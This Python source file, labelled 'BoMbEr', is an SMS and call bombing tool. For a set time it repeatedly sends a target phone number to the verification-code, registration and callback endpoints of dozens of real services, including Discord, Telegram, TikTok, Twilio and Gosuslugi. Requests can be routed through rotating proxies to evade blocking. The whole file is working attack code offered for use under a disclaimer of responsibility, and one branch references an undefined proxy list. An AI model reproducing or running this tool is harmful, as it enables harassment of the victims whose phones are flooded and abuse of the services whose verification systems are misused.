# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#---------------------------------------(sms)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from threading import Thread
from functools import reduce
from requests import get, post
from os.path import exists, isfile
from random import choice, randint
from colorama import Fore, Back, Style, init

colorama.init()

def sms(prx, number, tm, code):

	header = {
		"Content-Type": "application/json"
	}
	
	try:
		if prx == 'yes':
			proxy = []
			t = time.monotonic()

			with open(r"proxies.txt", "r", encoding="utf-8") as file:
				for line in file:
					proxy.append(line)

			proxy = [line.rstrip() for line in proxy]

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"u": "U"
					}
					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://auth.easypay.ua/api/check", json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"fio":"",
						"password":"2342uirejhwfr",
						"email":"",
						"emailAdvertAccepted":True,
						"phoneNumber":"+"+number,
						"webReferrer":"https://www.fonbet.ru/",
						"advertInfo":"",
						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
						"promoId":"",
						"ecupis":True,
						"birthday":"2000-12-12",
						"sysId":1,
						"lang":"ru",
						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
					}
					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"CountryCodeNumber": "+" + number[1:], 
						"IsoCountryCode": "RU", 
						"PhoneNumber": f"+{number}"
					}
					requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"landing": "loyalty",
						"phone": number
					}
					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=' '
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phoneNumber": num2,
						"lang": "ru",
						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
						"source": "showScreenSet",
						"sdk": "js_latest",
						"authMode": "cookie",
						"pageURL": "https://mega.ru/",
						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
						"sdkBuild": 12563,
						"format": "json"
					}
					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"change_phone_reason": "user_action_required",
						"phone": f"+{number}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')}, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num3=""
					num3+=num[4]
					num3+=num[5]
					num3+=num[6]
					num4=""
					num4+=num[7]
					num4+=num[8]
					num5=""
					num5+=num[9]
					num5+=num[10]
					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y", proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phoneNumber": f"+{number}"
					}
					requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload, proxies = proxies)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number}, proxies = proxies)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header, proxies = proxies)
				except:
					pass

		elif prx == 'no':
			t = time.monotonic()

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://auth.easypay.ua/api/check", json = payload)
				except:
					pass

				try:
					payload = {
						"CountryCodeNumber": "+" + number[1:], 
						"IsoCountryCode": "RU", 
						"PhoneNumber": f"+{number}"
					}
					requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload)
				except:
					pass

				try:
					requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header)
				except:
					pass

				try:
					payload = {
						"landing": "loyalty",
						"phone": number
					}
					requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
				except:
					pass

				try:
					payload = {
						"fio":"",
						"password":"2342uirejhwfr",
						"email":"",
						"emailAdvertAccepted":True,
						"phoneNumber":"+"+number,
						"webReferrer":"https://www.fonbet.ru/",
						"advertInfo":"",
						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
						"promoId":"",
						"ecupis":True,
						"birthday":"2000-12-12",
						"sysId":1,
						"lang":"ru",
						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
					}
					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload)
				except:
					pass

				try:
					payload = {
						"change_phone_reason": "user_action_required",
						"phone": f"+{number}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", json = payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=' '
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phoneNumber": num2,
						"lang": "ru",
						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
						"source": "showScreenSet",
						"sdk": "js_latest",
						"authMode": "cookie",
						"pageURL": "https://mega.ru/",
						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
						"sdkBuild": 12563,
						"format": "json"
					}
					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
				except:
					pass

				try:
					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"u": "U"
					}
					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					num = number
					num2=""
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num3=""
					num3+=num[4]
					num3+=num[5]
					num3+=num[6]
					num4=""
					num4+=num[7]
					num4+=num[8]
					num5=""
					num5+=num[9]
					num5+=num[10]
					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y")
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')})
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload)
				except:
					pass

				try:
					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {
						"phoneNumber": f"+{number}"
					}
					requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}")
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header)
				except:
					pass
					
		else:
			pass

	except:
		pass